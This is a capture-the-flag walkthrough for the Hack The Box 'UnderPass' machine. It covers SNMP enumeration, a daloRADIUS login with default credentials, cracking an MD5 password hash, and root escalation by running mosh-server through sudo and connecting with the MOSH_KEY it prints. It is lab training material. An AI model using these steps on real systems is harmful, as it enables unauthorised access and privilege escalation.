# HTB MACHINE UNDERPASS

## EASY - LINUX

# Enumeration

NMAP SCAN - TCP

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48:b0:d2:c7:29:26:ae:3d:fb:b7:6b:0f:f5:4d:2a:ea (ECDSA)
|_  256 cb:61:64:b8:1b:1b:b5:ba:b8:45:86:c5:16:bb:e2:a2 (ED25519)
80/tcp open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.52 (Ubuntu)
| http-methods:
|_  Supported Methods: POST OPTIONS HEAD GET
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
NMAP SCAN - UDP

```bash
PORT     STATE         SERVICE
161/udp  open          snmp
```

SNMP CHECK

```bash
└──╼ [★]$ snmp-check 10.10.11.48
snmp-check v1.9 - SNMP enumerator
Copyright (c) 2005-2015 by Matteo Cantoni (www.nothink.org)

[+] Try to connect to 10.10.11.48:161 using SNMPv1 and community 'public'

[*] System information:

  Host IP address               : 10.10.11.48
  Hostname                      : UnDerPass.htb is the only daloradius server in the basin!
  Description                   : Linux underpass 5.15.0-126-generic #136-Ubuntu SMP Wed Nov 6 10:38:22 UTC 2024 x86_64
  Contact                       : steve@underpass.htb
  Location                      : Nevada, U.S.A. but not Vegas
  Uptime snmp                   : 00:05:30.56
  Uptime system                 : 00:05:20.51
  System date                   : 2025-8-18 13:05:48.0
```

This mentions daloradius, we can test http://underpass.htb/daloradius if it is running

<img width="935" height="377" alt="image" src="https://github.com/user-attachments/assets/d23e5152-7c3c-4ca0-86c4-7694234c3f7e" />

We get a 403 Forbidden, we can enumerate daloradius to check for more juicy stuff

After reading online we find the operator login has default credentials and the path on how to login

<img width="766" height="272" alt="image" src="https://github.com/user-attachments/assets/40065c17-e089-4d42-b747-b0addb153504" />

The default credentials work and we see a user svcMosh and the MD5 password stored under Users Listing

<img width="836" height="368" alt="image" src="https://github.com/user-attachments/assets/a0dc8d4b-f3df-4595-a555-a7d1f8733d33" />

We can try and crack this locally but since this is a md5, we can use my best friend crackstation.net

<img width="641" height="218" alt="image" src="https://github.com/user-attachments/assets/d0c35dfb-7310-4a82-bf05-43b2557cb521" />

we can now ssh into the machine and grab the flag

```bash
└──╼ [★]$ ssh svcMosh@underpass.htb
svcMosh@underpass.htb's password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Mon Aug 18 01:22:02 PM UTC 2025

  System load:  0.07              Processes:             226
  Usage of /:   49.1% of 6.56GB   Users logged in:       0
  Memory usage: 10%               IPv4 address for eth0: 10.10.11.48
  Swap usage:   0%


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Aug 18 13:22:04 2025 from 10.10.14.12
svcMosh@underpass:~$ ls
user.txt
```

Enumerating further and since we have the pw for the user, the first thing I check is sudo -l

```bash
svcMosh@underpass:~$ sudo -l
Matching Defaults entries for svcMosh on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User svcMosh may run the following commands on localhost:
    (ALL) NOPASSWD: /usr/bin/mosh-server
```

Reading up onilne about mosh we find this - 

<img width="775" height="553" alt="image" src="https://github.com/user-attachments/assets/cff5613f-8157-4fe0-b075-588fe26172f3" />

We dont find much info on how to exploit this but the thing I found is mosh-server and mosh-client work hand in hand, we can use mosh-server to stand up a udp based ssh server which can be connected to via mosh-client without a password

Testing this we see -

```bash

svcMosh@underpass:~$ sudo mosh-server


MOSH CONNECT 60001 DVh69TY7DzMA75bgflQqNQ

mosh-server (mosh 1.3.2) [build mosh 1.3.2]
Copyright 2012 Keith Winstein <mosh-devel@mit.edu>
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>.
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.

[mosh-server detached, pid = 1691]
```

when I try to connect using mosh-client I get a error- 

```bash
svcMosh@underpass:~$ mosh-client 127.0.0.1 60001
MOSH_KEY environment variable not found.
```

Lets set the MOSH_KEY environment variable and rerun the command

```bash
MOSH_KEY=DVh69TY7DzMA75bgflQqNQ;mosh-client 127.0.0.1 60001
```

and BOOM, we are root

```bash
root@underpass:~# id
uid=0(root) gid=0(root) groups=0(root)
root@underpass:~# ls
root.txt
```



